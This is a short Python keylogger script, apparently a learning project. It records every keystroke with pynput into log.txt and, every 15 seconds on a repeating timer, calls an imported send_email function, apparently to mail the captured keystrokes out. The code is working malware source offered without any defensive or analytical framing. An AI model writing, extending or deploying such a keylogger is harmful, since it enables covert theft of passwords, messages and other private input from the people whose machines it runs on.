# # File Handling throught key logger

# f=open("log.txt",'a')

# # filedata=f.read()
# # print(filedata)
# f.close()
# #r-read
# #w-write
# #a-append

# #listeners foe keystroke

from pynput.keyboard import Listener
# from pynput.keyboard import keyboard
import os 
from time import sleep
import threading
import smtplib
from datetime import datetime
from mail_agger import send_email


global interval
interval=15

def writetofile(key):
    letter=str(key)
    letter=letter.replace("'","")
    if letter=="Key.space":
        letter=' '
    if letter=="Key.shift_r":
        letter=''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
        
    with open("log.txt",'a') as f:
        f.write(letter)



def report():
    global interval
    send_email()
    print("Mail Sent")
    
    timer=threading.Timer(interval,report)
    timer.start()


with Listener(on_press=writetofile)as l:
    report()
    l.join()





